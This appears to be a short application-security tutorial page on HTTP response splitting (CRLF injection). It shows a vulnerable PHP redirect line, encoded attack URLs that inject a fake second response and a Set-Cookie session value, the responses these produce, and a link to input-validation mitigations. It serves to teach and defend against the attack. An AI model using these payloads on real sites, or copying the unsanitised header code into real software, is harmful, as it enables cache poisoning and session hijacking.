# HTTP Response splitting

## Attack tree

```text
1 Provide a URL with a complete second response, to be rendered in the browser (OR)
2 Inject HTTP headers into the response (for example a Set-Cookie header)
```

## Examples

### Provide a url with a complete second response

In the application:

    header("Location: {$_GET['url']}");

Normal send request:

    http://example.org/redirect.php?url=http%3A%2F%2Fexample.org%2Ftarget.php

A browser receiving this response transparently requests the new resource (indicated in the Location header), and it 
is the response to this second request that is actually rendered in the browser:
    
    HTTP/1.1 302 Found
    Server: Apache/1.3.33 (Debian GNU/Linux)
    Location: http://example.org/target.php
    Content-Length: 0

So now you can attack with:
    
    http://example.org/redirect.php?url=http%3A%2F%2Fexample.org%2Ftarget.php%0D%0A%0D%0AHTTP%2F1.1+200+OK%0D%0AContent-Type%3A+text%2Fhtml%0D%0AContent-Length%3A+34%0D%0A%3Chtml%3E%3Cp%3EHacked%3C%2Fp%3E%3C%2Fhtml%3E

And it generates:

    HTTP/1.1 302 Found
    Server: Apache/1.3.33 (Debian GNU/Linux)
    Location: http://example.org/target.php
     
    HTTP/1.1 200 OK
    Content-Type: text/html
    Content-Length: 34
     
    <html><p>Hacked</p></html>
     
    Content-Length: 0

### Inject Set-Cookie header

Or send:

    http://example.org/redirect.php?url=http%3A%2F%2Fexample.org%2Ftarget.php%0D%0ASet-Cookie%3A+PHPSESSID%3D1234

This results in a response that sets a cookie:

    HTTP/1.1 302 Found
    Server: Apache/1.3.33 (Debian GNU/Linux)
    Location: http://example.org/target.php
    Set-Cookie: PHPSESSID=1234
    Content-Length: 0

And now you know the session identifier.

## Notes

HTTP Response Splitting or CRLF injection enables various attacks such as web cache poisoning, cross user defacement, 
hijacking pages with sensitive user information and cross-site scripting (XSS). 

If you can inject newline characters into the header, then you can inject new HTTP headers and by injecting an 
empty line, break out of the headers into the message body and write arbitrary content into the application's response.

You may need to use url encoding, or double url encoding, etc.

## Mitigations

* [Input validation](app-mitigations:docs/coding/input)